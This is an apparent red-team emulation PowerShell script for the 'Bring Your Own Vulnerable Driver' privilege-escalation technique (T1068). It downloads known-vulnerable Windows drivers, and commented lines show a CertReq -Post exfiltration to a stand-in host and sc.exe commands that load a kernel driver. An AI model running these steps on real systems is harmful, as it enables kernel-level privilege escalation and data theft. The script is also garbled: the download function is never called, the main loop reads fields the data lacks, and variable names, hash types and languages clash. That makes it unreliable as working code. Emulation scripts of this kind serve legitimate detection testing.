# Bring Your Own Vulnerable Driver
# Technic ID : T1068
Clear-Host
Write-Output "==============================================================================="
Write-Output " Exploitation for Privilege Exploitation (T1068)"
Write-Output " Driver : Windivert.sys"
Write-Output "==============================================================================="
################ [ GLOBAL VARIABLES ] ################
$TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
$StoragePath = "$env:PUBLIC\Toolz";
$LogFile = "$env:PUBLIC\exf\Vuln_Drivers_windivert.txt";
$DownloadUrl = "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers"

$VulnDriversArray = @(
    [PSCustomObject]@{
        UID ="89ed5be7ea83c01d0de33d3519944aa5";
        DrvName = "windivert.sys"
    },
        [PSCustomObject]@{
        UID ="32365e3e64d28cc94756ac9a09b67f06";
        DrvName = "amigendrv64.sys"
    }
)
################ [ FUNCTIONS ] ################
# Function to Download files
function DownloadFiles {
    param(
        [Parameter(Mandatory = $false)]
        [string]$DownloadFrom=$DownloadUrl,
        [Parameter(Mandatory = $true)]
        [string]$DonwnloadedFileName,
        [Parameter(Mandatory = $true)]
        [string]$StorageFileName,
        [Parameter(Mandatory = $false)]
        [string]$StorageDirectory=$StoragePath
        )
$WhatToDownload = $DownloadFrom+"/"+$DonwnloadedFileName+".bin"
$Full_Destination = $StorageDirectory+"\"+$StorageFileName
$CompleteCommand = "Invoke-WebRequest -Uri " + "$WhatToDownload" + " -outfile " + "$Full_Destination";
try {
    
    Invoke-Expression  "$CompleteCommand";
    Write-Output "Successfully Downloaded file $DownloadedFileName from $DownloadFrom" | Out-File -FilePath "$LogFile" -Encoding ascii -Append;     
    if ([System.IO.File]::Exists("$Full_Destination")) {
        Write-Output "Successfully Stored file $StorageFileName in $DestinationDirectory" | Out-File -FilePath "$LogFile" -Encoding ascii -Append; 
        # Check downloaded file MD5 summ
        $Md5Check = (Get-FileHash -Path $Full_Destination -Algorithm MD5).Hash
        # Compare CheckSumms
            if ($Md5Check -eq $DonwnloadedFileName) {
                Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
                Write-Output " [ MD5SUM checks OK ] Stored File name : $StorageFileName" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
                Write-Output "                     Orignal File name : $DownloadedFileName" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
                Write-Output "                     Computed md5 summ : $Md5Check" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
                Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
                return                                                
            } else {
                Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding ascii -Append                
                Write-Output "[ ERROR ] $StorageFileName : somme SHA256 incorrecte." | Out-File -FilePath "$LogFile" -Encoding ascii -Append
                Write-Output "             Expected summ : $DownloadedFileName" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
                Write-Output "             Computed summ : $Md5Check" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
                Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
                exit 3;
            }
    } 
    else {
        Write-Output "The file $Full_Destination does not exists !!!" | Out-File -FilePath "$LogFile" -Encoding ascii -Append; 
        exit 2;
    };

}
catch {
    Write-Output "Error : $($_.Exception.Message)" | Out-File -FilePath "$LogFile" -Encoding ascii -Append; 
    exit 1;   
}
}


# CertReq -Post -config https://www.example.org/file.ext C:\Windows\Temp\file.ext file.txt
# sc.exe create amigendrv64.sys binPath=C:\windows\temp\amigendrv64.sys type=kernel && sc.exe start amigendrv64.sys


################ [ MAIN BODY ] ################
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Force
Write-output "Script : $PSCommandPath has been launched on $TimeStamp" | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append

# Loop to manage each entry in the array.

foreach ($ligne in $VulnDriversArray) {
    $source = $ligne."01"
    $destination = $ligne."02"
    $shaAttendue = $ligne."03"

    # Vérifie que le fichier source existe
    if (Test-Path $source) {
        try {
            # Renomme le fichier
            Rename-Item -Path $source -NewName $destination -Force -ErrorAction Stop

            # Calcule la somme SHA256 du fichier renommé
            $shaCalculee = (Get-FileHash -Path $destination -Algorithm SHA256).Hash

            # Compare les sommes
            if ($shaCalculee -eq $shaAttendue) {
                Write-Host "[OK] $destination : somme SHA256 correcte."
            } else {
                Write-Host "[ERREUR] $destination : somme SHA256 incorrecte."
                Write-Host "  Attendu : $shaAttendue"
                Write-Host "  Calculé : $shaCalculee"
            }
        }
        catch {
            Write-Host "[ERREUR] Impossible de renommer $source vers $destination : $_"
        }
    } else {
        Write-Host "[ERREUR] Le fichier source $source n'existe pas."
    }
}

